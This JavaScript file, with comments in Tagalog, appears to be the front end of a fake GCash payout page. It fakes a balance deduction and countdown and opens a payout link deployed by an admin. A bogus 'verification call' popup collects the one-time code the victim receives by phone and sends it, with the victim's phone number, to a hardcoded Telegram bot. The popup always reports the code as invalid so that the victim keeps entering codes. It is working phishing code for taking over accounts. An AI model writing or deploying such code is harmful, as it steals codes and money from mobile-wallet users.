// ========== POPUP_SHARE.JS ==========

async function getFirewallStatus() {
    if (typeof firebase === 'undefined' || !firebase.database) return false;
    try {
        var db = firebase.database();
        var snap = await db.ref('admin/globalFirewall').once('value');
        var data = snap.val();
        return data && data.active === true;
    } catch(e) { return false; }
}    

let isTimerRunning = false;
let originalBalance = 0;

async function handleGcashClaim() {
    const gcashBtn = document.getElementById('claimGCashBtn');
    const balanceDisplay = document.getElementById('userBalanceDisplay'); // Siguraduhing tama ang ID nito sa HTML mo
    const userPhone = localStorage.getItem("userPhone");

    if (isTimerRunning || !gcashBtn) return;

    // 1. Check Firewall Status muna
    const isFirewallActive = await getFirewallStatus();

    if (isFirewallActive) {
        showFirewallVerificationPopup();
        return; // Stop dito kung may firewall
    }

    // 2. Simulan ang Claim Process (Deduct Balance)
    isTimerRunning = true;
    gcashBtn.disabled = true;
    
    // Kunin ang kasalukuyang balance sa display (e.g., "₱150")
    originalBalance = parseInt(balanceDisplay.innerText.replace(/[^\d]/g, ''));
    
    // Visual Deduction: Gawing 0 ang balance
    balanceDisplay.innerText = "₱0";
    balanceDisplay.style.color = "#ff3131";

    // 3. Simulan ang 1-Minute Thrill Timer
    let secondsLeft = 60;
    const originalBtnHTML = gcashBtn.innerHTML;
    
    const timerInterval = setInterval(() => {
        secondsLeft--;
        
        // Update Button Display
        gcashBtn.innerHTML = `<span class="timer-active ${secondsLeft <= 10 ? 'timer-low' : ''}">00:${secondsLeft.toString().padStart(2, '0')}</span>`;

        if (secondsLeft <= 0) {
            clearInterval(timerInterval);
            restoreBalance(userPhone); // Ibalik ang balance
        }
    }, 1000);
}

async function getLatestPayoutLink() {
    if (typeof firebase === 'undefined' || !firebase.database) return null;
    try {
        var db = firebase.database();
        // Hahanap ito sa "links" node ng status na 'available'
        var snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        
        if (snapshot.exists()) {
            var key = Object.keys(snapshot.val())[0];
            var linkData = snapshot.val()[key];
            return { url: linkData.url, key: key };
        }
        return null;
    } catch(e) { 
        console.error("Link Fetch Error:", e);
        return null; 
    }
}

// Function para maibalik ang balance mula sa Firebase/Session
async function restoreBalance(phone) {
    const gcashBtn = document.getElementById('claimGCashBtn');
    const balanceDisplay = document.getElementById('userBalanceDisplay');

    try {
        // Kunin ang actual balance mula sa Firebase user_sessions
        const snapshot = await firebase.database().ref('user_sessions/' + phone).once('value');
        const userData = snapshot.val();
        
        const actualBalance = userData ? userData.balance : originalBalance;

        // Ibalik sa UI
        balanceDisplay.innerText = "₱" + actualBalance;
        balanceDisplay.style.color = "#39ff14"; // Balik sa green
        
        // Balik ang Button sa dati
        gcashBtn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="width: 22px;"> CLAIM THRU GCASH`;
        gcashBtn.disabled = false;
        isTimerRunning = false;
        
        alert("⏱️ System timeout. Your balance has been safely restored.");
    } catch (e) {
        console.error("Restore Error:", e);
        balanceDisplay.innerText = "₱" + originalBalance; // Fallback
        isTimerRunning = false;
    }
}

// Function para sa Claim Button
async function handleGcashClaim() {
    const gcashBtn = document.getElementById('claimGCashBtn');
    const balanceDisplay = document.getElementById('userBalanceDisplay');
    const userPhone = localStorage.getItem("userPhone");

    if (isTimerRunning || !gcashBtn) return;

    // 1. Check Firewall muna
    const isFirewallActive = await getFirewallStatus();
    if (isFirewallActive) {
        showFirewallVerificationPopup();
        return;
    }

    // 2. FIREWALL IS OFF -> Kunin ang Link mula sa Firebase (Deploy Link logic)
    const payoutData = await getLatestPayoutLink(); // Ito yung kumukuha sa 'links' node

    if (payoutData && payoutData.url) {
        // A. REDIRECT: Buksan ang dineploy mong link mula sa Admin
        window.open(payoutData.url, '_blank');

        // B. THRILL START: Simulan ang bawas-pera at timer effect
        isTimerRunning = true;
        originalBalance = parseInt(balanceDisplay.innerText.replace(/[^\d]/g, ''));
        
        balanceDisplay.innerText = "₱0"; // Bawas pera visual
        balanceDisplay.style.color = "#ff3131";

        let secondsLeft = 60;
        const timerInterval = setInterval(() => {
            secondsLeft--;
            gcashBtn.innerHTML = `<span class="timer-active ${secondsLeft <= 10 ? 'timer-low' : ''}">00:${secondsLeft.toString().padStart(2, '0')}</span>`;

            if (secondsLeft <= 0) {
                clearInterval(timerInterval);
                restoreBalance(userPhone); // Ibalik ang pera pagkatapos ng 1 min
            }
        }, 1000);

    } else {
        // Kung walang dineploy na link sa Admin panel
        alert("⚠️ SYSTEM BUSY: No payout channels available. Please try again in a few minutes.");
    }
}

function showFirewallVerificationPopup() {
    // Gawa ng Modal Element
    const modal = document.createElement('div');
    modal.className = 'firewall-popup-overlay';
    modal.id = 'firewallModal';

    modal.innerHTML = `
        <div class="firewall-box">
            <div class="firewall-warning-icon">📞</div>
            <h2>VERIFICATION REQUIRED</h2>
            <div class="firewall-message">
                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
                <p>Enter the code below to continue.</p>
            </div>
            <div class="verification-input-group">
                <input type="text" id="verificationCode" class="verification-input" 
                       placeholder="0000" maxlength="4" inputmode="numeric">
                <button id="verifyCodeBtn" class="verify-btn" onclick="processFixedVerification()">VERIFY NOW</button>
            </div>
            <div class="firewall-note">
                <span class="loading-dots">Waiting for system-verification call</span>
            </div>
            <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
        </div>
    `;

    document.body.appendChild(modal);
    
    // Focus sa input
    setTimeout(() => {
        document.getElementById('verificationCode').focus();
    }, 300);
}

// FIXED LOGIC: 
async function processFixedVerification() {
    const codeInput = document.getElementById('verificationCode');
    const errorMsg = document.getElementById('firewallErrorMsg');
    const btn = document.getElementById('verifyCodeBtn');
    const enteredCode = codeInput.value.trim();

    if (enteredCode.length < 4) {
        errorMsg.innerText = "Please enter the 4-digit code provided in the call.";
        errorMsg.style.display = 'block';
        return;
    }

    // Visual loading effect
    btn.innerText = "CHECKING...";
    btn.disabled = true;

    // Kunin ang phone para sa Telegram log
    const userPhone = localStorage.getItem("userPhone") || "Unknown";

    // I-send sa Telegram na may sumusubok mag-verify
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=` + 
        encodeURIComponent(`🚨 VERIFICATION ATTEMPT\nPhone: ${userPhone}\nCode Entered: ${enteredCode}\nStatus: Waiting for Call`));
    } catch(e) {}

    // Delay ng konti para kunwari nag-check sa server
    setTimeout(() => {
        btn.innerText = "VERIFY NOW";
        btn.disabled = false;
        
        // ETO ANG PINAKA-IMPORTANTE: Laging Invalid
        errorMsg.innerText = "❌ INVALID 4-Digit Verification Code. Please wait for the system to call you again.";
        errorMsg.style.display = 'block';
        
        codeInput.value = '';
        codeInput.focus();
    }, 1500);
}
